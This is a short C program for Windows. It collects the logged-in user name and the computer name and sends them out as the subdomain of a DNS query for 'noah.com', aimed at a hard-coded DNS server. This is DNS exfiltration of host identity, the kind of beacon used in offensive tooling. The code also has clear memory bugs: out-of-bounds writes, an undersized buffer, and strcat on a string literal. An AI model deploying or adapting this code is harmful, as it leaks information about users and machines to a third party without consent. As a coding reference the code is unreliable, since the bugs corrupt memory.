#include <windows.h>
#include <windns.h>
#include <stdio.h>    

#define DOMAIN "noah.com"
#define DNSSRV "192.168.50.51"

#define MAX_UNSIZE (256 + 1)
#define MAX_COMPSIZE (MAX_COMPUTERNAME_LENGTH + 1)

char computerName[MAX_COMPSIZE];
char userName[MAX_UNSIZE];

void SpaceChanger(char *word)
{
    for(int i=0; i < strlen(word); i++)
    {
        if(word[i] == ' ')
            word[i] = '-';
    }
}

void GetCompInfo()
{
    // Declare a buffer to hold the computer name
    DWORD size = sizeof(computerName) / sizeof(char);
    GetComputerName(computerName, &size);
    strcat(computerName, ".");
    computerName[MAX_COMPSIZE] = computerName[strlen(computerName)];
    SpaceChanger(computerName);
}

void GetUserInfo()
{
    // Declare a buffer to hold the computer name
    DWORD size = sizeof(userName) / sizeof(char);
    GetUserNameA(userName, &size);
    strcat(userName, "-");
    userName[MAX_UNSIZE] = userName[strlen(userName)];
    SpaceChanger(userName);
}

int DnsQuery(LPSTR domain, WORD dnsRecordType, const char* dnsSrvIp )
{
    DNS_STATUS status;               // return value of  DnsQuery_A() function.
    PDNS_RECORD pDnsRecord;          //pointer to DNS_RECORD structure
    PIP4_ARRAY pSrvList = NULL;      //pointer to IP4_ARRAY structure
    DNS_FREE_TYPE freetype ;
    freetype =  DnsFreeRecordListDeep;
    IN_ADDR ipaddr;

    int combSize = strlen(userName) + strlen(computerName) + strlen(domain);
    char comb[combSize];
    strcpy(comb, userName);
    strcat(comb, computerName);
    strcat(comb, domain);
    LPTSTR pOwnerName = comb;        //owner name to be queried

    pSrvList = (PIP4_ARRAY) LocalAlloc(LPTR,sizeof(IP4_ARRAY));
    if (!pSrvList)
    {
        exit(1);
    }

    pSrvList->AddrCount = 1;
    pSrvList->AddrArray[0] = inet_addr(dnsSrvIp); //DNS server IP address
    if ( pSrvList->AddrArray[0] == INADDR_NONE ) {
        printf("Invalid DNS server IP address \n");
        exit(1);
    }

    status = DnsQuery_A(pOwnerName,                 //pointer to OwnerName
                        dnsRecordType,              //Type of the record to be queried
                        DNS_QUERY_BYPASS_CACHE,     // Bypasses the resolver cache on the lookup.
                        pSrvList,                   //contains DNS server IP address
                        &pDnsRecord,                //Resource record comprising the response
                        NULL);                     //reserved for future use

    DnsRecordListFree(pDnsRecord, freetype); // Free memory allocated for DNS records
    LocalFree(pSrvList);
    
    return 0;
}

int main()
{
    char * dnsServer = (char*)DNSSRV;
    strcat(dnsServer, "\0");
    
    GetCompInfo();
    GetUserInfo();
    DnsQuery( (LPTSTR)DOMAIN, DNS_TYPE_A, dnsServer);
    return 0;
}